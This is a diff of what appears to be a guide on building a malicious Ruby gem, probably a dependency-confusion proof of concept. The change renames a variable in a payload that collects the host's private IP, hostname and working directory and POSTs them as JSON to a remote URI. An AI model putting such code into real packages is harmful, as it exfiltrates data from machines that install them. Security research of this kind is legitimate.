@@ -73,8 +73,8 @@ $ nano <package_name>.gem
         require 'net/http'
         require 'socket'
 
-        #System IP
-        sysip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+        #Private IP
+        privip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
         #Hostname
         hostname = Socket.gethostname
         #Current directory
@@ -85,7 +85,7 @@ $ nano <package_name>.gem
         req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
 
         req.body = {
-          private_ip: sysip,
+          private_ip: privip,
           hostname: hostname,
           current_directory: dir
         }.to_json
